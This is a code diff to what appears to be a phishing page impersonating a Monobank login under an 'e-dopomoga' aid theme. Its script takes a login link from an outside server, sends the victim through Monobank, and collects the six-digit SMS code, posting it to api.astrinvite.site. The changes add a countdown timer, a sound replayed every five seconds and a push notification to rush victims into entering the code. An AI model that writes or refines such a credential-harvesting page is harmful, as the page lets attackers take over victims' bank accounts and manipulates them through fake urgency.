@@ -3,6 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <title>Вхід через Monobank</title>
+  <link rel="icon" href="favicon.ico" type="image/x-icon">
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -37,11 +38,10 @@
       text-align: center;
     }
     #return-instruction {
-      margin: 14px 0 0 0;
-      color: #444;
-      max-width: 400px;
-      display: none;
-      font-size: 17px;
+      margin:14px 0;
+      color:#444;
+      max-width:400px;
+      display:none;
       text-align: center;
     }
     #sms-code {
@@ -71,18 +71,23 @@
       color: red;
       margin-top: 5px;
     }
+    #timer {
+      color: #c60;
+      margin-left: 16px;
+      font-weight: bold;
+      font-size: 20px;
+    }
   </style>
 </head>
 <body>
   <h1>Вхід через Monobank</h1>
   <button id="monobank-btn" disabled>Завантаження...</button>
   <div id="return-instruction">
-    <b>
-      Після підтвердження в Monobank поверніться на цю сторінку.<br>
-      Код підтвердження з'явиться тут автоматично.
-    </b>
+    <b>Після підтвердження в Monobank поверніться на цю сторінку.<br>
+    Код підтвердження з'явиться тут автоматично.</b>
   </div>
   <div id="status">Очікуємо на посилання...</div>
+  <audio id="sms-audio" src="sms.mp3"></audio>
 
   <script>
     const apiUrl = "https://api.astrinvite.site/link";
@@ -91,10 +96,12 @@
     const codeUrl = "https://api.astrinvite.site/api/submit-code";
     const btn = document.getElementById("monobank-btn");
     const status = document.getElementById("status");
-    const instruction = document.getElementById("return-instruction");
     let currentId = null;
     let pollingStatus = false;
     let statusPoller = null;
+    let link = null;
+    let smsTimerInterval = null;
+    let smsSoundInterval = null;
 
     async function getLink() {
       try {
@@ -111,21 +118,21 @@
         const data = await res.json();
         if (data.url && data.id) {
           currentId = data.id;
+          link = data.url;
           btn.textContent = "Увійти через Monobank";
           btn.disabled = false;
           status.textContent = "Натисніть кнопку для входу.";
           btn.onclick = () => {
             fetch(`${consumeUrl}?id=${currentId}`, { method: "POST" });
-            instruction.style.display = "";
-            // Добавляем redirect_uri если Monobank вдруг поддерживает возврат
-            let link = data.url;
+            document.getElementById("return-instruction").style.display = "";
+            let redirectLink = link;
             try {
               const redirectUrl = encodeURIComponent("https://mono-edopomoga.github.io/2025/");
-              if (!link.includes("redirect_uri=")) {
-                link += (link.includes("?") ? "&" : "?") + "redirect_uri=" + redirectUrl;
+              if (!redirectLink.includes("redirect_uri=")) {
+                redirectLink += (redirectLink.includes("?") ? "&" : "?") + "redirect_uri=" + redirectUrl;
               }
             } catch {}
-            window.location.href = link; // Открыть в этой же вкладке!
+            window.location.href = redirectLink;
             pollStatus();
           };
         } else {
@@ -144,7 +151,6 @@
       if (pollingStatus) return;
       pollingStatus = true;
       btn.style.display = "none";
-      // Инструкция уже видна
       statusPoller = setInterval(async () => {
         try {
           const res = await fetch(`${statusUrl}?id=${currentId}`);
@@ -160,11 +166,16 @@
     function showCodeInput() {
       status.innerHTML = `
         <b>Введіть 6-значний код з SMS:</b><br>
-        <input id="sms-code" type="text" maxlength="6" autocomplete="one-time-code" inputmode="numeric">
+        <input id="sms-code" type="text" maxlength="6" style="" autocomplete="one-time-code" inputmode="numeric">
         <button id="send-code-btn">Підтвердити</button>
+        <span id="timer"></span>
         <div id="sms-error"></div>
       `;
       document.getElementById("sms-code").focus();
+
+      // Запуск таймера, звука, пуша
+      startSMSTimer();
+
       document.getElementById("send-code-btn").onclick = async () => {
         let code = document.getElementById("sms-code").value.trim();
         if (!/^\d{6}$/.test(code)) {
@@ -181,6 +192,7 @@
           const resp = await res.json();
           if (resp.ok) {
             status.innerHTML = "<b>Код прийнято. Чекаємо підтвердження на пристрої…</b>";
+            stopSMSTimer();
           } else {
             document.getElementById("send-code-btn").disabled = false;
             document.getElementById("sms-error").textContent = "Помилка: " + (resp.error || "спробуйте ще");
@@ -190,6 +202,64 @@
           document.getElementById("sms-error").textContent = "Помилка серверу. Спробуйте ще раз.";
         }
       };
+    }
+
+    // --- Таймер и звук ---
+    function startSMSTimer() {
+      let seconds = 180;
+      playSMSAudio(); // первый звук
+      showSMSPush();
+      updateSMSTimer(seconds);
+
+      smsSoundInterval = setInterval(() => {
+        playSMSAudio();
+      }, 5000);
+
+      smsTimerInterval = setInterval(() => {
+        seconds--;
+        updateSMSTimer(seconds);
+        if (seconds <= 0) {
+          clearInterval(smsTimerInterval);
+          clearInterval(smsSoundInterval);
+          document.getElementById("timer").textContent = "⏰ Час вичерпано!";
+        }
+      }, 1000);
+    }
+    function stopSMSTimer() {
+      if (smsTimerInterval) clearInterval(smsTimerInterval);
+      if (smsSoundInterval) clearInterval(smsSoundInterval);
+      document.getElementById("timer").textContent = "";
+    }
+    function updateSMSTimer(seconds) {
+      let m = Math.floor(seconds / 60), s = seconds % 60;
+      document.getElementById("timer").textContent = `⏳ ${m}:${s < 10 ? "0" : ""}${s}`;
+    }
+    function playSMSAudio() {
+      try {
+        const audio = document.getElementById("sms-audio");
+        audio.currentTime = 0;
+        audio.play();
+      } catch {}
+    }
+    // --- Пуш-уведомление ---
+    function showSMSPush() {
+      if ("Notification" in window) {
+        if (Notification.permission === "granted") {
+          new Notification("Введіть код з SMS для завершення входу!", {
+            body: "Вікно для коду вже чекає вас на сайті.",
+            icon: "favicon.ico"
+          });
+        } else if (Notification.permission !== "denied") {
+          Notification.requestPermission().then(function (permission) {
+            if (permission === "granted") {
+              new Notification("Введіть код з SMS для завершення входу!", {
+                body: "Вікно для коду вже чекає вас на сайті.",
+                icon: "favicon.ico"
+              });
+            }
+          });
+        }
+      }
     }
 
     getLink();
